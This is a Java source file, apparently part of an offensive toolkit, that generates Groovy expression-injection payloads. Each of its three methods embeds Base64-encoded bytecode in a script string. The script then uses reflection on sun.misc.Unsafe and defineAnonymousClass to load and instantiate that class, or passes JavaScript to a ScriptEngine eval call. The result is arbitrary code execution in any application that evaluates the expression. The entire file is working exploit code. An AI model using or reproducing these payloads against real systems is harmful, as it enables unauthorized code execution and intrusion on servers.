package cn.butler.thirdparty.payloads.expression;

import java.util.Base64;

/**
 * Groovy(GroovyShell,GroovyLoader)类加载模板
 */
public class GroovyExpression {
    public static String groovyShellExpressModifyUtilBase64(byte[] byteCode) {
        String base64 = Base64.getEncoder().encodeToString(byteCode);
        String script = "def evilClassBase64 ='"+ base64 +"';\n" +
            "def classBytes = Base64.decoder.decode(evilClassBase64.trim());\n" +
            "def unsafeClass = Class.forName(\"sun.misc.Unsafe\");\n" +
            "def theUnsafeField = unsafeClass.getDeclaredField(\"theUnsafe\");\n" +
            "theUnsafeField.setAccessible(true);\n" +
            "def unsafe = theUnsafeField.get(null);\n" +
            "def clazz = unsafe.defineAnonymousClass(Object.class, classBytes, null);\n" +
            "def instance = clazz.newInstance();";
        return script;
    }

    public static String groovyShellExpressModifyMiscBase64(byte[] byteCode) {
        String base64 = Base64.getEncoder().encodeToString(byteCode);
        String script = "def debugClassBase64 ='"+ base64 +"';\n" +
            "def bASE64Decoder = Class.forName(\"sun.misc.BASE64Decoder\").newInstance();\n" +
            "def classBytes = bASE64Decoder.decodeBuffer(debugClassBase64.trim());\n" +
            "def unsafeClass = Class.forName(\"sun.misc.Unsafe\");\n" +
            "def theUnsafeField = unsafeClass.getDeclaredField(\"theUnsafe\");\n" +
            "theUnsafeField.setAccessible(true);\n" +
            "def unsafe = theUnsafeField.get(null);\n" +
            "def clazz = unsafe.defineAnonymousClass(Object.class, classBytes, null);\n" +
            "def instance = clazz.newInstance();";
        return script;
    }

    public static String groovyShellExpressModifyByJSCode(byte[] byteCode) {
        String jscode = JSExpression.unsafeExpressModify(byteCode);
        String script = "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + jscode + "\");";
        return script;
    }
}
